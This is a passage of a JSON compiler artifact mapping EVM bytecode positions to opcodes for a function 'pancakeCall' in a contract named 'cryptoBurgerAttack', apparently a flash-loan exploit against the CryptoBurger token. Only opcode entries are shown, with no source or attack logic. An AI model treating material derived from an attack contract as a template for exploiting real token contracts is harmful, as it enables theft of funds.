    "6670": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6671": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8910,
        8925
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6672": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8910,
        8925
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6673": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8939,
        8943
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6674": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8939,
        8943
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6675": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "6677": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "ADD",
      "path": "0"
    },
    "6678": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "6681": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8846,
        8953
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6682": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6683": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6685": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6687": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6688": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6689": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "DUP4",
      "path": "0"
    },
    "6690": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "SUB",
      "path": "0"
    },
    "6691": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6692": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6693": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "GAS",
      "path": "0"
    },
    "6694": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "6695": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "6696": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6697": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "6698": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1A37"
    },
    "6701": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "6702": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6703": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6705": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6706": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "6707": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6708": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6710": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "REVERT",
      "path": "0"
    },
    "6711": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6712": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "POP",
      "path": "0"
    },
    "6713": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "POP",
      "path": "0"
    },
    "6714": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "POP",
      "path": "0"
    },
    "6715": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "POP",
      "path": "0"
    },
    "6716": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6718": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6719": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6720": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6722": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "DUP3",
      "path": "0"
    },
    "6723": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "6724": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "6726": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6727": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6728": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6729": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "ADD",
      "path": "0"
    },
    "6730": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "6732": {
      "op": "NOT"
    },
    "6733": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "AND",
      "path": "0"
    },
    "6734": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "DUP3",
      "path": "0"
    },
    "6735": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "ADD",
      "path": "0"
    },
    "6736": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6738": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "6739": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1A5F"
    },
    "6742": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "6743": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6744": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6745": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "ADD",
      "path": "0"
    },
    "6746": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6747": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "6750": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8846,
        8953
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6751": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6752": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8831,
        8953
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6753": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8831,
        8953
      ],
      "op": "POP",
      "path": "0"
    },
    "6754": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8963,
        9027
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 60,
      "value": "0x1A95"
    },
    "6757": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6759": {
      "op": "DUP1"
    },
    "6760": {
      "op": "MLOAD"
    },
    "6761": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6763": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "6766": {
      "op": "DUP4"
    },
    "6767": {
      "op": "CODECOPY"
    },
    "6768": {
      "op": "DUP2"
    },
    "6769": {
      "op": "MLOAD"
    },
    "6770": {
      "op": "SWAP2"
    },
    "6771": {
      "op": "MSTORE"
    },
    "6772": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6774": {
      "op": "DUP1"
    },
    "6775": {
      "op": "MLOAD"
    },
    "6776": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6778": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "6781": {
      "op": "DUP4"
    },
    "6782": {
      "op": "CODECOPY"
    },
    "6783": {
      "op": "DUP2"
    },
    "6784": {
      "op": "MLOAD"
    },
    "6785": {
      "op": "SWAP2"
    },
    "6786": {
      "op": "MSTORE"
    },
    "6787": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8984,
        8996
      ],
      "op": "DUP4",
      "path": "0"
    },
    "6788": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8997,
        8998
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6790": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8984,
        8999
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6791": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8984,
        8999
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6792": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8984,
        8999
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6793": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8984,
        8999
      ],
      "op": "LT",
      "path": "0"
    },
    "6794": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8984,
        8999
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "6797": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8984,
        8999
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "6798": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8984,
        8999
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "6801": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8984,
        8999
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "6804": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8984,
        8999
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6805": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8963,
        9027
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6806": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 61,
      "value": "0x40"
    },
    "6808": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6809": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "6814": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "6816": {
      "op": "SHL"
    },
    "6817": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6818": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "6819": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6821": {
      "op": "DUP1"
    },
    "6822": {
      "op": "MLOAD"
    },
    "6823": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6825": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "6828": {
      "op": "DUP4"
    },
    "6829": {
      "op": "CODECOPY"
    },
    "6830": {
      "op": "DUP2"
    },
    "6831": {
      "op": "MLOAD"
    },
    "6832": {
      "op": "SWAP2"
    },
    "6833": {
      "op": "MSTORE"
    },
    "6834": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6835": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9102
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "6840": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9102
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6841": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1AC8"
    },
    "6844": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6845": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9116,
        9131
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6846": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9116,
        9131
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6847": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9145,
        9149
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6848": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9145,
        9149
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6849": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "6851": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "ADD",
      "path": "0"
    },
    "6852": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "6855": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        9052,
        9159
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6856": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6857": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6859": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6861": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6862": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6863": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "DUP4",
      "path": "0"
    },
    "6864": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "SUB",
      "path": "0"
    },
    "6865": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6866": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6867": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "GAS",
      "path": "0"
    },
    "6868": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "6869": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "6870": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6871": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "6872": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1AE5"
    },
    "6875": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "6876": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6877": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6879": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6880": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "6881": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6882": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6884": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "REVERT",
      "path": "0"
    },
    "6885": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6886": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "POP",
      "path": "0"
    },
    "6887": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "POP",
      "path": "0"
    },
    "6888": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "POP",
      "path": "0"
    },
    "6889": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "POP",
      "path": "0"
    },
    "6890": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6892": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6893": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6894": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6896": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "DUP3",
      "path": "0"
    },
    "6897": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "6898": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "6900": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6901": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6902": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6903": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "ADD",
      "path": "0"
    },
    "6904": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "6906": {
      "op": "NOT"
    },
    "6907": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "AND",
      "path": "0"
    },
    "6908": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "DUP3",
      "path": "0"
    },
    "6909": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "ADD",
      "path": "0"
    },
    "6910": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6912": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "6913": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1B0D"
    },
    "6916": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "6917": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6918": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6919": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "ADD",
      "path": "0"
    },
    "6920": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6921": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "6924": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        9052,
        9159
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6925": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9052,
        9159
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6926": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9037,
        9159
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6927": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9037,
        9159
      ],
      "op": "POP",
      "path": "0"
    },
    "6928": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9169,
        9233
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 62,
      "value": "0x1B43"
    },
    "6931": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6933": {
      "op": "DUP1"
    },
    "6934": {
      "op": "MLOAD"
    },
    "6935": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6937": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "6940": {
      "op": "DUP4"
    },
    "6941": {
      "op": "CODECOPY"
    },
    "6942": {
      "op": "DUP2"
    },
    "6943": {
      "op": "MLOAD"
    },
    "6944": {
      "op": "SWAP2"
    },
    "6945": {
      "op": "MSTORE"
    },
    "6946": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6948": {
      "op": "DUP1"
    },
    "6949": {
      "op": "MLOAD"
    },
    "6950": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6952": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "6955": {
      "op": "DUP4"
    },
    "6956": {
      "op": "CODECOPY"
    },
    "6957": {
      "op": "DUP2"
    },
    "6958": {
      "op": "MLOAD"
    },
    "6959": {
      "op": "SWAP2"
    },
    "6960": {
      "op": "MSTORE"
    },
    "6961": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9190,
        9202
      ],
      "op": "DUP4",
      "path": "0"
    },
    "6962": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9203,
        9204
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6964": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9190,
        9205
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6965": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9190,
        9205
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6966": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9190,
        9205
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6967": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9190,
        9205
      ],
      "op": "LT",
      "path": "0"
    },
    "6968": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9190,
        9205
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "6971": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9190,
        9205
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "6972": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9190,
        9205
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "6975": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9190,
        9205
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "6978": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        9190,
        9205
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6979": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9169,
        9233
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6980": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 63,
      "value": "0x40"
    },
    "6982": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6983": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "6988": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "6990": {
      "op": "SHL"
    },
    "6991": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6992": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "6993": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6995": {
      "op": "DUP1"
    },
    "6996": {
      "op": "MLOAD"
    },
    "6997": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6999": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "7002": {
      "op": "DUP4"
    },
    "7003": {
      "op": "CODECOPY"
    },
    "7004": {
      "op": "DUP2"
    },
    "7005": {
      "op": "MLOAD"
    },
    "7006": {
      "op": "SWAP2"
    },
    "7007": {
